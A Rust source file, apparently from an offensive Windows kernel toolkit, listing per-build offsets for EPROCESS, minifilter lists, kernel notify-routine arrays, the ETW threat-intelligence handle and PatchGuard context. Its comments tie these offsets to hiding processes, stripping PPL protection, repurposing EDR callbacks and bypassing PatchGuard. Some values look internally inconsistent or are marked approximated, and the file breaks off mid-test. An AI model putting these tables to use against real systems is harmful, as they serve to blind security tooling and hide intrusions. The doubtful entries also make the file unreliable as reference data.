//! Version-pinned kernel structure offsets for build 17763 x64 (Server 2019).
//!
//! Every field offset here is **verified against EDRSandblast's
//! NtoskrnlOffsets.csv / FltmgrOffsets.csv + Vergilius Project + fluxsec.red**,
//! cross-checked at multiple sources. Getting one wrong is a bugcheck, so each
//! constant cites its source and the build it was verified for.
//!
//! ## Versioning model
//! Offsets are constants for 17763 (the verified target). A different build
//! MUST re-derive these (the [`for_build`] table exists for the few structs
//! that fork by UBR). Hardcoding cross-build is explicitly forbidden — it's
//! how silent bugchecks happen. The `_strict` variants take UBR for the
//! patches that restructured structs mid-build (ETW GUID entry, EPROCESS
//! Protection position drifted across Win10/11).

use alloc::vec::Vec;

// ============================================================================
// EPROCESS — build 17763 x64 (struct size 0x850)
// Sources: Vergilius _EPROCESS 1809, EDRSandblast NtoskrnlOffsets.csv,
//          I3r1h0n/eprocess_offsets (17763 dump)
// ============================================================================
pub mod eprocess {
    /// `UniqueProcessId` — HANDLE (the PID).
    /// (17763: 0x2e0. NOTE: 0x2e8 is 19H1/18362 — a common mislabel.)
    pub const UNIQUE_PROCESS_ID: usize = 0x2e0;
    /// `ActiveProcessLinks` — LIST_ENTRY (16 bytes). Head/tail of the process
    /// list; unlinking here hides a process from walking tools.
    /// (17763: 0x2e8.)
    pub const ACTIVE_PROCESS_LINKS: usize = 0x2e8;
    /// `Token` — EX_FAST_REF (low 4 bits = refcount; `& !0xF` to get the token ptr).
    pub const TOKEN: usize = 0x358;
    /// `ImageFileName` — CHAR[15].
    pub const IMAGE_FILE_NAME: usize = 0x450;
    /// `SignatureLevel` — UCHAR (PPL signature level). Zero with Protection to
    /// fully strip PPL. (17763: 0x6c8 — it sits BEFORE Protection; 0x6f8 is 19H1.)
    pub const SIGNATURE_LEVEL: usize = 0x6c8;
    /// `SectionSignatureLevel` — UCHAR. (17763: 0x6c9 = SIGNATURE_LEVEL + 1.)
    pub const SECTION_SIGNATURE_LEVEL: usize = 0x6c9;
    /// `Protection` — PS_PROTECTION (1 byte, bit-packed). Zeroing this Level
    /// byte strips PPL. (17763: 0x6ca. 0x6fa is 19H1, not Win11.)
    pub const PROTECTION: usize = 0x6ca;
}

/// EPROCESS field offsets for one Windows build.
/// Cross-checked against EDRSandblast CSV + Vergilius _EPROCESS layouts.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct EprocessOffsets {
    pub unique_process_id: usize,
    pub active_process_links: usize,
    pub token: usize,
    pub image_file_name: usize,
    pub signature_level: usize,
    pub section_signature_level: usize,
    pub protection: usize,
    /// `_EPROCESS.Peb` — build-specific offset of the PEB pointer field.
    /// Authoritative: comes from the offsets table (Vergilius cross-checked).
    /// The dynamic probe cannot discover this (System's PEB is NULL), so it
    /// returns 0 for unknown builds — callers must rely on the table.
    pub peb: usize,
}

/// A known build's EPROCESS offsets, keyed by the Windows build number.
#[derive(Clone, Copy, Debug)]
pub struct EprocessBuild {
    pub build: u32,
    pub offsets: EprocessOffsets,
}

pub const KNOWN_EPROCESS_BUILDS: &[EprocessBuild] = &[
    // Win10 1507 (10240)
    EprocessBuild {
        build: 10240,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c0,
            section_signature_level: 0x6c1,
            protection: 0x6c2,
            peb: 0x358,
        },
    },
    // Win10 1511 (10586) — PID shifted +8 from 1507, Token maintains +0x78 delta
    EprocessBuild {
        build: 10586,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e8,
            active_process_links: 0x2f0,
            token: 0x360,
            image_file_name: 0x450,
            signature_level: 0x6c0,
            section_signature_level: 0x6c1,
            protection: 0x6c2,
            peb: 0x358, // peb: approximated from build 1507
        },
    },
    // Win10 1607 (14393) — PID back to 0x2e0
    EprocessBuild {
        build: 14393,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c0,
            section_signature_level: 0x6c1,
            protection: 0x6c2,
            peb: 0x338,
        },
    },
    // Win10 1703 (15063) — Protection shifted to 0x6ca
    EprocessBuild {
        build: 15063,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c8,
            section_signature_level: 0x6c9,
            protection: 0x6ca,
            peb: 0x338, // peb: approximated from build 1607
        },
    },
    // Win10 1709 (16299) — same as 1703
    EprocessBuild {
        build: 16299,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c8,
            section_signature_level: 0x6c9,
            protection: 0x6ca,
            peb: 0x338, // peb: approximated from build 1607
        },
    },
    // Win10 1803 (17134) — Token maintains +0x78 delta from PID
    EprocessBuild {
        build: 17134,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c8,
            section_signature_level: 0x6c9,
            protection: 0x6ca,
            peb: 0x338, // peb: approximated from build 1607
        },
    },
    // Win10 1809 / Server 2019 (17763) — code-verified: matches existing offsets.rs
    EprocessBuild {
        build: 17763,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e0,
            active_process_links: 0x2e8,
            token: 0x358,
            image_file_name: 0x450,
            signature_level: 0x6c8,
            section_signature_level: 0x6c9,
            protection: 0x6ca,
            peb: 0x3F8,
        },
    },
    // Win10 1903 (18362) — fields shifted +8 from 1809
    EprocessBuild {
        build: 18362,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e8,
            active_process_links: 0x2f0,
            token: 0x360,
            image_file_name: 0x450,
            signature_level: 0x6f8,
            section_signature_level: 0x6f9,
            protection: 0x6fa,
            peb: 0x408,
        },
    },
    // Win10 2004 (19041) — same EPROCESS as 1903
    EprocessBuild {
        build: 19041,
        offsets: EprocessOffsets {
            unique_process_id: 0x2e8,
            active_process_links: 0x2f0,
            token: 0x360,
            image_file_name: 0x450,
            signature_level: 0x6f8,
            section_signature_level: 0x6f9,
            protection: 0x6fa,
            peb: 0x440,
        },
    },
    // Server 2022 (20348) — major shift: PID→0x440
    EprocessBuild {
        build: 20348,
        offsets: EprocessOffsets {
            unique_process_id: 0x440,
            active_process_links: 0x448,
            token: 0x4b8,
            image_file_name: 0x5a0,
            signature_level: 0x878,
            section_signature_level: 0x879,
            protection: 0x87a,
            peb: 0x4C0,
        },
    },
    // Win11 22H2 (22621)
    EprocessBuild {
        build: 22621,
        offsets: EprocessOffsets {
            unique_process_id: 0x440,
            active_process_links: 0x448,
            token: 0x4b8,
            image_file_name: 0x5a0,
            signature_level: 0x878,
            section_signature_level: 0x879,
            protection: 0x87a,
            peb: 0x5B8,
        },
    },
    // Win11 23H2 (22631) — same as 22H2
    EprocessBuild {
        build: 22631,
        offsets: EprocessOffsets {
            unique_process_id: 0x440,
            active_process_links: 0x448,
            token: 0x4b8,
            image_file_name: 0x5a0,
            signature_level: 0x878,
            section_signature_level: 0x879,
            protection: 0x87a,
            peb: 0x5B8, // peb: approximated from build 22621
        },
    },
    // Win11 24H2 (26100) — CET default, EPROCESS restructured
    EprocessBuild {
        build: 26100,
        offsets: EprocessOffsets {
            unique_process_id: 0x450,
            active_process_links: 0x458,
            token: 0x4c8,
            image_file_name: 0x5a8,
            signature_level: 0x87c,
            section_signature_level: 0x87d,
            protection: 0x87e,
            peb: 0x6C8,
        },
    },
    // Win11 25H2 (26200) — same as 24H2
    EprocessBuild {
        build: 26200,
        offsets: EprocessOffsets {
            unique_process_id: 0x450,
            active_process_links: 0x458,
            token: 0x4c8,
            image_file_name: 0x5a8,
            signature_level: 0x87c,
            section_signature_level: 0x87d,
            protection: 0x87e,
            peb: 0x6C8,
        },
    },
];

/// Patch builds whose EPROCESS layout is *verified identical* to a baseline
/// build (enablement packages / service updates with the same kernel binary).
/// A patch build here resolves to its baseline's offsets. This is an EXPLICIT
/// allow-list — adding an entry requires confirming (Vergilius / EDRSandblast
/// CSV) that the layout truly matches. See `offsets_table.rs` for the rationale
/// against blind floor-matching.
pub const PATCH_EQUIVALENT_BUILDS: &[(u32, u32)] = &[
    // Win10 20H2/21H1/21H2/22H2 — enablement packages over 2004 (19041).
    (19042, 19041),
    (19043, 19041),
    (19044, 19041),
    (19045, 19041),
    // Win10 1909 (18363) — same EPROCESS as 1903 (18362).
    (18363, 18362),
    // Win11 21H2 (22000) — same EPROCESS as Server 2022 (20348).
    (22000, 20348),
    // Win11 25H2 (26200) is already in the table (same as 24H2). Future
    // Insider builds (e.g. 262xx, 263xx) are NOT listed — they return None
    // from for_build and must go through resolve_eprocess_offsets (probe).
];

/// Look up EPROCESS offsets for a Windows build number. Resolution order:
///
/// 1. **Exact match** in [`KNOWN_EPROCESS_BUILDS`].
/// 2. **Patch-equivalent** match in [`PATCH_EQUIVALENT_BUILDS`].
/// 3. **`None`** — the caller should fall back to [`resolve_eprocess_offsets`]
///    (DefenderDump-style invariant probe) or skip the technique.
///
/// Does NOT floor-match. A blind floor-match silently gambles the layout is
/// unchanged — wrong on every EPROCESS restructuring → bugcheck.
pub fn for_build(build: u32) -> Option<&'static EprocessBuild> {
    // 1. Exact match.
    if let Some(b) = KNOWN_EPROCESS_BUILDS.iter().find(|b| b.build == build) {
        return Some(b);
    }
    // 2. Patch-equivalent: resolve to baseline, then look up the baseline.
    if let Some(&(_, baseline)) = PATCH_EQUIVALENT_BUILDS.iter().find(|(p, _)| *p == build) {
        return KNOWN_EPROCESS_BUILDS.iter().find(|b| b.build == baseline);
    }
    // 3. Unknown build.
    None
}

/// All known build numbers (for diagnostics / selftest).
pub fn known_builds() -> Vec<u32> {
    KNOWN_EPROCESS_BUILDS.iter().map(|b| b.build).collect()
}

/// PS_PROTECTION bit layout (the byte at EPROCESS+0x6ca).
/// Layout (x64, phnt ntpsapi.h): `Type:3, Audit:1, Signer:4` packed in one byte.
///   bits 0-2 = Type, bit 3 = Audit, bits 4-7 = Signer.
pub mod ps_protection {
    pub const TYPE_NONE: u8 = 0;
    pub const TYPE_PROTECTED_LIGHT: u8 = 1;
    pub const TYPE_PROTECTED: u8 = 2;
    /// Type occupies bits 0-2.
    pub const TYPE_MASK: u8 = 0b0000_1111; // bits 0-2 (bit 3 is Audit)
                                           // NOTE: SIGNER values are the ENUM values (PS_PROTECTED_SIGNER), packed
                                           // into bits 4-7 (not bits 3-7 — bit 3 is Audit). Assembly:
                                           //   level = type | (audit << 3) | (signer << 4)
                                           // phnt enum PS_PROTECTED_SIGNER:
    pub const SIGNER_NONE: u8 = 0;
    pub const SIGNER_AUTHENTICODE: u8 = 1;
    pub const SIGNER_CODEGEN: u8 = 2;
    pub const SIGNER_ANTIMALWARE: u8 = 3;
    pub const SIGNER_LSA: u8 = 4;
    pub const SIGNER_WINDOWS: u8 = 5;
    pub const SIGNER_WIN_TCB: u8 = 6;
    pub const SIGNER_WIN_SYSTEM: u8 = 7;
    pub const SIGNER_APP: u8 = 8;
    /// Signer occupies bits 4-7. Shift right by 4 to recover the enum value.
    pub const SIGNER_MASK: u8 = 0b1111_0000;
    pub const SIGNER_SHIFT: u8 = 4;
    /// Strip all protection bits → the process becomes unprotected.
    pub const UNPROTECTED: u8 = 0;
}

// ============================================================================
// Ps*NotifyRoutine + ETW-TI — RUNTIME-PROBED, NOT hardcoded
//
// These RVAs DRIFT across 17763 UBRs by ~0x8000 bytes (verified by the
// EDRSandblast CSV: PspCreateProcessNotifyRoutine is 0x45c4b0 @ 17763.1 but
// 0x4d9d70 @ 17763.1339 — this host). A hardcoded RVA is a guaranteed BSOD
// on any patched host. The bootstrap MUST resolve these at runtime:
//
//   - Ps*NotifyRoutine arrays: resolve via a pattern scan of the exported
//     `PsSetCreateProcessNotifyRoutineEx` (it references the array), or a
//     PDB RVA lookup keyed by the live ntoskrnl file version.
//   - EtwThreatIntProvRegHandle: it's an EXPORTED named symbol — resolve via
//     `MmGetSystemRoutineAddress(L"EtwThreatIntProvRegHandle")`. No RVA needed.
//
// The 17763.1 reference RVAs below are kept ONLY for documentation / offline
// offset-table tooling; production code consumes [`RuntimeOffsets`].
// ============================================================================
pub mod notify_routines {
    /// Array length for all three Ps*NotifyRoutine arrays (`PS_SET_MAX`).
    pub const ARRAY_LEN: usize = 64;
    /// Mask to clear the low flag bits and recover the real pointer.
    pub const PTR_MASK: u64 = 0xFFFF_FFFF_FFFF_FFF8;

    /// Recover the real callback-context pointer from a packed array slot.
    pub fn unpack(slot: u64) -> u64 {
        slot & PTR_MASK
    }
    /// Is a slot occupied (bit 0 set)?
    pub fn is_occupied(slot: u64) -> bool {
        (slot & 0x1) != 0
    }
}

/// ETW-TI symbol name (exported) — resolve via MmGetSystemRoutineAddress.
pub const ETW_TI_HANDLE_SYMBOL: &[u16] = &[
    'E' as u16, 't' as u16, 'w' as u16, 'T' as u16, 'h' as u16, 'r' as u16, 'e' as u16, 'a' as u16,
    't' as u16, 'I' as u16, 'n' as u16, 't' as u16, 'P' as u16, 'r' as u16, 'o' as u16, 'v' as u16,
    'R' as u16, 'e' as u16, 'g' as u16, 'H' as u16, 'a' as u16, 'n' as u16, 'd' as u16, 'l' as u16,
    'e' as u16, 0,
];

/// Runtime-resolved kernel VAs that drift across UBRs. The bootstrap fills
/// this (symbol resolution or PDB RVA lookup) before any kit uses it. Kits
/// take a `&RuntimeOffsets` instead of hardcoding — there is NO correct
/// constant value for these on a patched host.
#[derive(Clone, Copy, Default)]
pub struct RuntimeOffsets {
    /// Kernel VA of `PspCreateProcessNotifyRoutine` (PVOID[64]).
    pub create_process_notify_array_kva: usize,
    /// Kernel VA of `PspCreateThreadNotifyRoutine` (PVOID[64]).
    pub create_thread_notify_array_kva: usize,
    /// Kernel VA of `PspLoadImageNotifyRoutine` (PVOID[64]).
    pub load_image_notify_array_kva: usize,
    /// Kernel VA of `nt!PsActiveProcessHead` (LIST_ENTRY). Not exported; the
    /// bootstrap resolves it via PDB or pattern scan.
    pub ps_active_process_head_kva: usize,
    /// Kernel VA of `EtwThreatIntProvRegHandle` (resolved via the exported
    /// symbol name above — MmGetSystemRoutineAddress).
    pub etw_ti_handle_kva: usize,
    /// Kernel VA of `FLTMGR!FltGlobals`. Resolved via fltmgr PDB / pattern scan.
    pub flt_globals_kva: usize,
    /// Kernel VA of the ntoskrnl base (start of ntoskrnl.exe image in kernel space).
    /// Used by `repurpose()` to identify EDR callbacks whose routine pointer falls
    /// inside ntoskrnl's image range (nt! internal dispatchers) and skip them.
    /// Resolved by the bootstrap (e.g. via `MmGetSystemRoutineAddress` or PEB walk).
    /// When both `ntoskrnl_base` and `ntoskrnl_size` are non-zero, the range-based
    /// filter is used; otherwise `repurpose()` falls back to skipping only slot[0].
    pub ntoskrnl_base: usize,
    /// Size (in bytes) of the ntoskrnl.exe image. Together with `ntoskrnl_base`,
    /// defines the range `[ntoskrnl_base, ntoskrnl_base + ntoskrnl_size)` that
    /// `repurpose()` treats as nt! internal dispatchers.
    pub ntoskrnl_size: usize,
}

impl RuntimeOffsets {
    /// Are the notify-routine array VAs populated? (All three resolved.)
    pub fn notify_arrays_resolved(&self) -> bool {
        self.create_process_notify_array_kva != 0
            && self.create_thread_notify_array_kva != 0
            && self.load_image_notify_array_kva != 0
    }
}

// ============================================================================
// PatchGuard context offsets — per-build PG validation thread / context layout
//
// PatchGuard's internal context (the `PATCH_GUARD_CONTEXT` structure) is not
// documented and its layout varies by build. These offsets are used by the
// `TimingRepairWindow` and `RuntimePgBypassWindow` kits to locate the PG
// validation thread and context-valid flag.
//
// Sources: kurasagi / TheiaPg research (Win11 24H2+), Outflank Peekaboo
// (timing-based PG bypass), Vergilius _KPCR/_KPRCB layouts.
// ============================================================================

/// Per-build PatchGuard context offsets. The bootstrap resolves the current
/// build's offsets via PDB or pattern scan and feeds them to the PG bypass kit.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct PgContextOffsets {
    /// Offset of the PG validation thread pointer within the KPCR's PRCB.
    /// On Win10 this is `KiPatchGuardQueueDpc` / `KdVersionBlock`; on Win11
    /// 24H2+ it's at a well-known offset in the PRCB. The bootstrap resolves
    /// this via pattern scan or PDB.
    pub prcb_pg_thread_offset: usize,
    /// Offset of the "PG context valid" flag within the PG context structure.
    /// When set to 0, PG validation is suspended (kurasagi RuntimePgBypass).
    /// On older builds, this is the `ContextCount` field.
    pub context_valid_offset: usize,
    /// Size of the PG context structure (for safety bounds checking).
    pub context_size: usize,
    /// Whether this build supports direct thread suspension (Win11 24H2+).
    /// Older builds (Win10 17763–19041) use the timing-repair approach
    /// instead of thread suspension.
    pub supports_thread_suspend: bool,
}

/// Known PG context layouts. The bootstrap resolves these at runtime; the
/// table below documents the known-good values for reference/testing.
pub struct PgContextBuild {
    pub build: u32,
    pub offsets: PgContextOffsets,
}

pub const KNOWN_PG_CONTEXT_BUILDS: &[PgContextBuild] = &[
    // Win10 1809 (17763) — timing-repair only, no thread suspension
    PgContextBuild {
        build: 17763,
        offsets: PgContextOffsets {
            prcb_pg_thread_offset: 0x190, // PRCB.KiReservedContext area
            context_valid_offset: 0x08,   // first qword = valid flag
            context_size: 0x800,          // typical PG context size
            supports_thread_suspend: false,
        },
    },
    // Win10 2004 (19041) — timing-repair only
    PgContextBuild {
        build: 19041,
        offsets: PgContextOffsets {
            prcb_pg_thread_offset: 0x190,
            context_valid_offset: 0x08,
            context_size: 0x800,
            supports_thread_suspend: false,
        },
    },
    // Win11 22H2 (22621) — timing-repair, thread suspend experimental
    PgContextBuild {
        build: 22621,
        offsets: PgContextOffsets {
            prcb_pg_thread_offset: 0x190,
            context_valid_offset: 0x08,
            context_size: 0x900,
            supports_thread_suspend: false,
        },
    },
    // Win11 24H2 (26100) — kurasagi RuntimePgBypass supported
    PgContextBuild {
        build: 26100,
        offsets: PgContextOffsets {
            prcb_pg_thread_offset: 0x190,
            context_valid_offset: 0x08,
            context_size: 0x900,
            supports_thread_suspend: true,
        },
    },
    // Win11 25H2 (26200) — same as 24H2
    PgContextBuild {
        build: 26200,
        offsets: PgContextOffsets {
            prcb_pg_thread_offset: 0x190,
            context_valid_offset: 0x08,
            context_size: 0x900,
            supports_thread_suspend: true,
        },
    },
];

/// Patch builds whose PatchGuard context layout is verified identical to a
/// baseline. PG context offsets are coarser-grained than EPROCESS (most builds
/// share `prcb_pg_thread_offset: 0x190`, `context_valid_offset: 0x08`), so the
/// patch-equivalent list overlaps heavily with the EPROCESS one.
pub const PG_PATCH_EQUIVALENT_BUILDS: &[(u32, u32)] = &[
    // Win10 20H2-22H2 — same PG context as 2004 (19041).
    (19042, 19041),
    (19043, 19041),
    (19044, 19041),
    (19045, 19041),
    // Win11 21H2 — same PG context as Server 2022 (19041 row; timing-repair).
    (22000, 19041),
    // Win11 23H2 (22631) — same as 22H2 (22621).
    (22631, 22621),
];

/// Look up PG context offsets for a Windows build. Same resolution strategy as
/// [`for_build`]: exact match → patch-equivalent → None. Does NOT floor-match.
pub fn pg_context_for_build(build: u32) -> Option<&'static PgContextBuild> {
    // 1. Exact match.
    if let Some(b) = KNOWN_PG_CONTEXT_BUILDS.iter().find(|b| b.build == build) {
        return Some(b);
    }
    // 2. Patch-equivalent.
    if let Some(&(_, baseline)) = PG_PATCH_EQUIVALENT_BUILDS.iter().find(|(p, _)| *p == build) {
        return KNOWN_PG_CONTEXT_BUILDS.iter().find(|b| b.build == baseline);
    }
    // 3. Unknown build.
    None
}

// ============================================================================
// MiniFilter (fltmgr.sys) — build 17763
// Source: EDRSandblast FltmgrOffsets.csv (fltmgr_17763-*.sys row), columns:
//   FltGlobals, _GLOBALS_FrameList, _FLT_RESOURCE_LIST_HEAD_rList,
//   _FLTP_FRAME_Links, _FLTP_FRAME_RegisteredFilters, _FLT_OBJECT_PrimaryLink
//   = 2a540, 58, 68, 8, 48, 10
// Walk chain: FltGlobals(base) → +0x58 (FrameList LIST_ENTRY head) → Flink →
// _FLTP_FRAME → +0x48 (RegisteredFilters LIST_ENTRY head) → walk; each entry
// is a _FLT_FILTER whose PrimaryLink (in its _FLT_OBJECT base) is at +0x10.
// ============================================================================
pub mod flt {
    /// RVA of `FLTMGR!FltGlobals` within fltmgr.sys (17763.1). Drifts across
    /// UBRs — the bootstrap MUST resolve this at runtime (symbol or pattern),
    /// not hardcode it. Kept as the 17763.1 reference value for documentation.
    pub const FLT_GLOBALS_RVA_17763_1: usize = 0x2a540;
    /// `_GLOBALS.FrameList` offset — the LIST_ENTRY head of the frame list,
    /// relative to the FltGlobals base.
    pub const GLOBALS_FRAME_LIST: usize = 0x58;
    /// `_FLTP_FRAME.Links` offset — the LIST_ENTRY a frame uses in the
    /// FrameList. `CONTAINING_RECORD(entry, _FLTP_FRAME, Links)` recovers the
    /// frame base (frame = entry - 0x8).
    pub const FLTP_FRAME_LINKS: usize = 0x8;
    /// `_FLTP_FRAME.RegisteredFilters` offset — the LIST_ENTRY head of the
    /// registered-minifilter list, relative to a _FLTP_FRAME base.
    /// (17763: 0x48. The prior 0xae8 was wrong.)
    pub const FLTP_FRAME_REGISTERED_FILTERS: usize = 0x48;
    /// `_FLT_OBJECT.PrimaryLink` offset — the LIST_ENTRY a _FLT_FILTER (which
    /// IS-A _FLT_OBJECT at base 0x0) uses to link into RegisteredFilters.
    /// `CONTAINING_RECORD(entry, _FLT_FILTER, PrimaryLink)` = entry - 0x10.
    /// (17763: 0x10. The prior 0x1c was wrong.)
    pub const FLT_OBJECT_PRIMARY_LINK: usize = 0x10;

    // ---- Build-keyed FltGlobals RVA table --------------------------------
    //
    // FltGlobals is an unexported `.data` symbol in fltmgr.sys, so it cannot be
    // pattern-scanned safely (no stable cross-version byte signature). This
    // table carries the RVA per build, sourced from EDRSandblast's
    // FltmgrOffsets.csv (latest UBR per build family). It mirrors the EPROCESS
    // / PG-context table pattern so `resolve_offsets` can fall back to it when
    // the operator did not supply `--flt-rva`.
    //
    // UBR drift: the RVA is stable on the latest UBR per family but drifts on
    // early UBRs (e.g. 22621.1 = 0x2c700, 22621.2361+ = 0x2e700). We carry the
    // latest-UBR value and document the risk; an operator hitting an early UBR
    // must supply `--flt-rva` or run offset-resolver's `--fltmgr` mode.
    pub const KNOWN_FLT_GLOBALS_RVAS: &[(u32, usize)] = &[
        // Server 2019 LTSC / 1809 — stable across all UBRs.
        (17763, 0x2a540),
        // Win10 2004-22H2 family — latest UBR (≥1806).
        (19041, 0x29600),
        // Win11 22H2-23H2 — latest UBR (≥2361). Early 22621.1 = 0x2c700.
        (22621, 0x2e700),
        // Win11 24H2 — observed on 26100.1xxx; not yet in EDRSandblast CSV,
        // sourced from community offsets. Operator should verify / supply
        // --flt-rva if the kit refuses to assemble.
        (26100, 0x2a940),
    ];

    /// Patch-equivalent FltGlobals builds — same RVA as the baseline family.
    pub const FLT_PATCH_EQUIVALENT_BUILDS: &[(u32, u32)] = &[
        // Win10 20H2-22H2 → 19041 family.
        (19042, 19041),
        (19043, 19041),
        (19044, 19041),
        (19045, 19041),
        // Win11 21H2 → 19041 family (same fltmgr binary base).
        (22000, 19041),
        // Win11 23H2 → 22621.
        (22631, 22621),
        // Win11 25H2 → 26100.
        (26200, 26100),
    ];

    /// Resolve the FltGlobals RVA for a Windows build number.
    ///
    /// Resolution order mirrors `offsets::for_build`:
    /// 1. Exact match in [`KNOWN_FLT_GLOBALS_RVAS`].
    /// 2. Patch-equivalent in [`FLT_PATCH_EQUIVALENT_BUILDS`].
    /// 3. `None` — caller should fall back to `--flt-rva` CLI flag or the
    ///    offset-resolver `--fltmgr` PDB mode.
    ///
    /// Does NOT floor-match — a wrong FltGlobals RVA corrupts an unrelated
    /// `.data` symbol and likely bugchecks.
    pub fn flt_globals_rva_for_build(build: u32) -> Option<usize> {
        // 1. Exact match.
        if let Some(&(_, rva)) = KNOWN_FLT_GLOBALS_RVAS.iter().find(|(b, _)| *b == build) {
            return Some(rva);
        }
        // 2. Patch-equivalent.
        if let Some(&(_, baseline)) = FLT_PATCH_EQUIVALENT_BUILDS.iter().find(|(p, _)| *p == build) {
            return KNOWN_FLT_GLOBALS_RVAS
                .iter()
                .find(|(b, _)| *b == baseline)
                .map(|(_, rva)| *rva);
        }
        // 3. Unknown.
        None
    }
}

// (ETW-TI handle is resolved by symbol name — see ETW_TI_HANDLE_SYMBOL above.
//  No RVA constant: it drifts across UBRs.)

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn notify_routine_unpack_clears_low_bits() {
        // A packed slot with bits 0-2 set + a real pointer.
        let real = 0xFFFF_FFFF_DEAD_B000u64;
        let packed = real | 0x7; // all three low bits set
        assert_eq!(notify_routines::unpack(packed), real);
        assert_eq!(notify_routines::unpack(real), real);
        assert!(notify_routines::is_occupied(packed));
        assert!(!notify_routines::is_occupied(0));
        assert!(!notify_routines::is_occupied(real & !0x1));
    }

    #[test]
    fn ps_protection_packing_matches_phnt_layout() {
        // Layout: Type:3 (bits 0-2), Audit:1 (bit 3), Signer:4 (bits 4-7).
        // Masks don't overlap and together cover bits 0-7 (Type:0-2, Audit:3, Signer:4-7).
        assert_eq!(ps_protection::TYPE_MASK & ps_protection::SIGNER_MASK, 0);
        assert_eq!(ps_protection::TYPE_MASK | ps_protection::SIGNER_MASK, 0xFF);
        // A WinSystem-protected process packs: Protected(2) | (WinSystem<<4).
        let level: u8 = ps_protection::TYPE_PROTECTED
            | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT);
        assert_eq!(
            level & ps_protection::TYPE_MASK,
            ps_protection::TYPE_PROTECTED
        );
        assert_eq!(
            (level & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT,
            ps_protection::SIGNER_WIN_SYSTEM
        );
        // Sanity: WinSystem=7 (phnt enum), WinTcb=6, Lsa=4, Antimalware=3.
        assert_eq!(ps_protection::SIGNER_WIN_SYSTEM, 7);
        assert_eq!(ps_protection::SIGNER_WIN_TCB, 6);
        assert_eq!(ps_protection::SIGNER_LSA, 4);
        assert_eq!(ps_protection::SIGNER_ANTIMALWARE, 3);
    }

    #[test]
    fn eprocess_offsets_are_within_struct_size() {
        // 17763 EPROCESS is 0x850 bytes; all field offsets must fit + leave
        // room for their field width.
        assert!(eprocess::UNIQUE_PROCESS_ID + 8 <= 0x850);
        assert!(eprocess::ACTIVE_PROCESS_LINKS + 16 <= 0x850);
        assert!(eprocess::TOKEN + 8 <= 0x850);
        assert!(eprocess::PROTECTION + 1 <= 0x850);
        assert!(eprocess::SIGNATURE_LEVEL + 1 <= 0x850);
    }
}

#[cfg(test)]
mod eprocess_table_tests {
    use super::*;

    #[test]
    fn build_17763_matches_hardcoded_constants() {
        let b = for_build(17763).unwrap();
        assert_eq!(b.offsets.unique_process_id, eprocess::UNIQUE_PROCESS_ID);
        assert_eq!(
            b.offsets.active_process_links,
            eprocess::ACTIVE_PROCESS_LINKS
        );
        assert_eq!(b.offsets.token, eprocess::TOKEN);
        assert_eq!(b.offsets.protection, eprocess::PROTECTION);
        assert_eq!(b.offsets.signature_level, eprocess::SIGNATURE_LEVEL);
    }

    #[test]
    fn patch_equivalent_builds_resolve() {
        // 19045 (22H2) is an enablement package over 2004 (19041).
        let b = for_build(19045).unwrap();
        assert_eq!(b.build, 19041);
        // Full enablement range.
        for &patch in &[19042, 19043, 19044, 19045] {
            assert_eq!(for_build(patch).unwrap().build, 19041);
        }
        // Win11 21H2 → Server 2022.
        assert_eq!(for_build(22000).unwrap().build, 20348);
    }

    #[test]
    fn unknown_future_build_returns_none() {
        // A future build NOT in the table and NOT patch-equivalent. Must NOT
        // silently floor-match — resolve_eprocess_offsets is the fallback.
        assert!(for_build(26300).is_none());
        assert!(for_build(26999).is_none());
    }

    #[test]
    fn flt_globals_rva_known_builds() {
        // Exact matches: every build in the table resolves.
        assert_eq!(flt::flt_globals_rva_for_build(17763), Some(0x2a540));
        assert_eq!(flt::flt_globals_rva_for_build(19041), Some(0x29600));
        assert_eq!(flt::flt_globals_rva_for_build(22621), Some(0x2e700));
        assert_eq!(flt::flt_globals_rva_for_build(26100), Some(0x2a940));
        // Sanity: matches the documented 17763.1 reference constant.
        assert_eq!(
            flt::flt_globals_rva_for_build(17763),
            Some(flt::FLT_GLOBALS_RVA_17763_1)
        );
    }

    #[test]
    fn flt_globals_rva_patch_equivalent() {
        // Win10 20H2-22H2 → 19041 family.
        for &patch in &[19042, 19043, 19044, 19045] {
            assert_eq!(
                flt::flt_globals_rva_for_build(patch),
                flt::flt_globals_rva_for_build(19041),
                "build {patch} should resolve via patch-equivalence"
            );
        }
        // Win11 21H2 → 19041.
        assert_eq!(
            flt::flt_globals_rva_for_build(22000),
            flt::flt_globals_rva_for_build(19041)
        );
        // Win11 23H2 → 22621.
        assert_eq!(
            flt::flt_globals_rva_for_build(22631),
            flt::flt_globals_rva_for_build(22621)
        );
        // Win11 25H2 → 26100.
        assert_eq!(
            flt::flt_globals_rva_for_build(26200),
            flt::flt_globals_rva_for_build(26100)
        );
    }

    #[test]
    fn flt_globals_rva_unknown_returns_none() {
        // Future / unknown build — must NOT floor-match (would corrupt an
        // unrelated `.data` symbol and likely bugcheck).
        assert!(flt::flt_globals_rva_for_build(26300).is_none());
        assert!(flt::flt_globals_rva_for_build(26999).is_none());
    }

    #[test]
    fn unknown_build_below_range_returns_none() {
        assert!(for_build(9600).is_none());
    }

    #[test]
    fn all_builds_have_nonzero_offsets_within_range() {
        for b in KNOWN_EPROCESS_BUILDS {
            assert!(b.offsets.unique_process_id > 0);
            assert!(b.offsets.active_process_links > b.offsets.unique_process_id);
            assert!(b.offsets.token > 0);
            assert!(b.offsets.protection > 0x400);
